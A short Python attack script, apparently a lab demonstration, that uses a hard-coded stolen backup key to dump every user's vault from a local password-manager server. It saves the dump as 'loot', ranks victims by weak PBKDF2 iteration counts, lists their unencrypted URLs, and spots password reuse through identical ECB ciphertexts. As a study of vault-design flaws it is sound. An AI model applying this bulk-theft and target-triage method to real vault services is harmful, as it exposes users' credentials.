import json
import os
import urllib.request
from collections import Counter

SERVER = "http://127.0.0.1:5001"
STOLEN_KEY = "devops-backup-key-123"  # the backup credential the attacker got
LOOT_FILE = os.path.join("loot", "stolen_vaults.json")

def grabBackup():
    """Download every user's vault in one request with the stolen key."""
    req = urllib.request.Request(SERVER + "/internal/backup")
    req.add_header("X-Backup-Key", STOLEN_KEY)
    with urllib.request.urlopen(req) as resp:
        return json.loads(resp.read())

def showTargets(vaults):
    """List users weakest first (fewest iterations) with their readable URLs."""
    print("Targets, weakest first (fewest PBKDF2 iterations):")
    for vault in sorted(vaults, key=lambda v: v["iterations"]):
        print(f"  {vault['iterations']:>7}  {vault['username']}")
        for entry in vault["entries"]:
            print(f"           {entry['url']}")  # unencrypted metadata

def showReuse(vaults):
    """Flag ECB passwords that share a ciphertext inside one vault."""
    print("\nECB password reuse (same ciphertext inside one vault):")
    for vault in vaults:
        ecb = [e["password"]["ciphertext"] for e in vault["entries"] if e["password"]["mode"] == "ECB"]
        for ciphertext, count in Counter(ecb).items():
            if count > 1:  # same ciphertext = same password
                print(f"  {vault['username']}: one password used on {count} sites")


def main():
    vaults = grabBackup()
    os.makedirs("loot", exist_ok=True)
    with open(LOOT_FILE, "w") as f:
        json.dump(vaults, f, indent=2)
    print(f"Stole {len(vaults)} vaults -> {LOOT_FILE}\n")

    # all readable without cracking anything
    showTargets(vaults)
    showReuse(vaults)


if __name__ == "__main__":
    main()